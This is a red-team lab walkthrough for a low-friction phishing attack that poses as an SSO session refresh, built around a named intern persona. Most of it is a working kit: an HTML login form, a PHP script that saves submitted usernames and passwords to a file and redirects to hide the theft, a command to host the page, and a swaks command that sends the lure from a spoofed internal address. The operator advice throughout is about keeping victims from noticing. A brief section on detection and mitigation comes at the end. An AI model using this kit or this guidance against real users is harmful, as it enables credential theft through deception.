## **Law 30 — Make Your Accomplishments Seem Effortless**

Interpretation (offensive context):  
The cleaner and more “normal” the interaction appears, the lower the scrutiny. You engineer flows that feel **routine, seamless, and low-friction**, so the target never perceives effort or anomaly.

---

# 🎯 Attack Scenario — _Seamless SSO Re-Auth Flow (Zero-Friction Credential Capture)_

You embed the attack inside a **natural-looking workflow** (e.g., SSO/session refresh) so the user completes it **without pausing to think**.

**Persona:**

> _Sophie Clarke_, 20 y/o Systems Intern

---

# 🔴 Red Team Objective

- Achieve:
    
    - **near-zero friction credential capture**
        
- Avoid:
    
    - cognitive interruption
        
    - suspicion triggers (urgency, long text, unusual steps)
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Workflow Framing (No Story, Just Continuation)

### Email:

> **Subject:** Session refresh
> 
> “Please continue your session:”
> 
> [http://192.168.56.101:8080](http://192.168.56.101:8080/)

👉 No narrative  
👉 No pressure  
👉 Feels like normal system flow

---

## Phase 2 — Minimal UI (Frictionless Page)

On Kali:

```bash
mkdir seamless && cd seamless
```

```html
<form action="cap.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Continue</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
header("Location: https://example.com/dashboard");
?>
```

👉 Immediate redirect preserves illusion of success

---

## Phase 3 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 4 — Delivery

```bash
swaks --to target@corp.local \
--from sophie.c@corp.local \
--server 192.168.56.101 \
--data "Subject: Session refresh

Please continue your session:

http://192.168.56.101:8080"
```

---

## Phase 5 — Execution

Target:

- assumes routine session expiry
    
- enters credentials
    
- gets redirected
    
- continues work
    

👉 No disruption → no suspicion

---

# 🛠️ Tooling + Commands

### Hosting:

```bash
php -S 0.0.0.0:8080
```

### Delivery:

```bash
swaks --to target@corp.local --from sophie.c@corp.local
```

### Capture:

```php
file_put_contents("creds.txt", ...)
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Cognitive ease** (low friction = compliance)
    
- **Routine exploitation**
    
- **Invisible manipulation**
    

Key principle:

> The best attack feels like nothing happened

---

# 🛡️ Detection & Defensive Insight

Indicators:

- login prompts triggered via email links
    
- seamless redirects masking credential capture
    
- absence of user-reported anomalies
    

Mitigation:

- enforce:
    
    - SSO only via official domains
        
- browser protections:
    
    - warn on unfamiliar login pages
        
- user training:
    
    - “Even normal flows must be verified”
        

---

# 📄 Report Artifact

### Title:

> Seamless Credential Harvest via Low-Friction Workflow Simulation

### Include:

- minimal email + UI
    
- redirect behavior
    
- credential capture evidence
    
- analysis:
    
    - why low friction increases success
        
- impact:
    
    - undetected compromise
        

---

# ⚠️ Operator Insight

If the user:

- pauses → you failed
    
- questions → you failed
    

Success condition:

> the action feels automatic

You don’t create effort  
You **remove it**

---

